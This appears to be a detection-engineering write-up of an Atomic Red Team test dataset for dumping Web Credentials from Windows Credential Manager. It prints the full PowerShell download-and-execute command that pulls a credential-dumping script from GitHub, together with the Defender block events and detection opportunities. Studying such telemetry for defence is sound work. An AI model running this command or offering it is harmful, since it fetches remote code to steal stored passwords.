# T1555-3: Credentials from Password Stores — Dump Credentials from Windows Credential Manager With PowerShell [Web Credentials]

## Technique Context

T1555 covers credential theft from password stores. This test is structurally identical to T1555-2 but targets the Web Credentials vault rather than the Windows Credentials vault. The Web Credentials vault stores browser-saved passwords that use the Windows Data Protection API (DPAPI) — typically from legacy Internet Explorer and Microsoft Edge (EdgeHTML) sessions. The test uses the same `GetCredmanCreds.ps1` script from the TriggerMan-S/Windows-Credential-Manager GitHub repository, but invokes `Get-CredManCreds` instead of `Get-PasswordVaultCredentials`. In real intrusions, both credential stores are typically enumerated together; separating them into distinct ART tests provides per-store telemetry coverage.

## What This Dataset Contains

The dataset spans approximately 5 seconds (2026-03-14T00:37:34Z – 00:37:39Z) on ACME-WS02.

**The attack command is visible in Security EID 4688 and PowerShell EID 4104:**

> `"powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}`

This is the same GitHub URL and commit hash as T1555-2, but with the `Get-CredManCreds` function. PowerShell EID 4103 records the `Invoke-WebRequest` call and, via `Invoke-Expression` parameter binding, the downloaded script source including the `CredEnum` API wrapper code.

**Windows Defender blocked the script**, producing the same AMSI pattern as T1555-2. PowerShell EID 4100 records:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

Sysmon events are structurally identical to T1555-2: Sysmon EID 1 for `whoami.exe` (tagged T1033) and a PowerShell process create, plus the standard set of DLL load events (EID 7) and a named pipe creation (EID 17). No DNS query event (EID 22) is present, consistent with the same sysmon filtering behavior observed in T1555-2.

## What This Dataset Does Not Contain (and Why)

**Web credential vault access.** AMSI blocked execution before `Get-CredManCreds` ran. No events related to the DPAPI credential store, the vault path at `%APPDATA%\Microsoft\Vault`, or any CredEnumerate API activity are present.

**Differentiation from T1555-2 in the telemetry.** Outside of the function name (`Get-CredManCreds` vs `Get-PasswordVaultCredentials`) embedded in the command line and script block, the telemetry pattern is nearly identical to T1555-2. Both tests download the same script, trigger the same AMSI block, and produce the same event type distribution. Detections written for T1555-2 will fire on T1555-3 as well, which is operationally correct — the differentiation is in the targeted vault, not the attack method.

**No object access events for the Web Credentials vault path.** Object access auditing is disabled in this environment; even if the attack had succeeded, file reads of `%APPDATA%\Microsoft\Vault\*` would not appear.

## Assessment

This dataset is a near-duplicate of T1555-2 from a telemetry structure perspective, with the distinguishing artifact being the function name `Get-CredManCreds` in the command line and scriptblock. The Defender AMSI block fires at the same point. The primary value of this dataset alongside T1555-2 is demonstrating that both vaults are targeted via the same tooling pattern, supporting correlation rules that fire on any invocation of `GetCredmanCreds.ps1` regardless of which function is called.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: Scriptblock contains `IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/...' ...)` and the function name `Get-CredManCreds`. The repository URL and pinned commit hash are identical to T1555-2.
- **PowerShell EID 4103**: `Invoke-WebRequest` with the exact URL; `Invoke-Expression` parameter binding captures the downloaded script body including the `CredEnumerate` API function.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent,InvokeExpressionCommand` — same AMSI block fingerprint as T1555-2. Correlation with T1555-2 activity (same host, same timeframe, same script URL) suggests systematic credential enumeration across both vaults.
- **Security EID 4688**: Command line contains `Get-CredManCreds` and the GitHub URL — differentiates this test from T1555-2 at the command-line level.
- **Cross-dataset correlation**: When T1555-2 and T1555-3 fire within seconds of each other on the same host, this pattern matches the behavior of automated credential harvesting that iterates over both credential vault types.
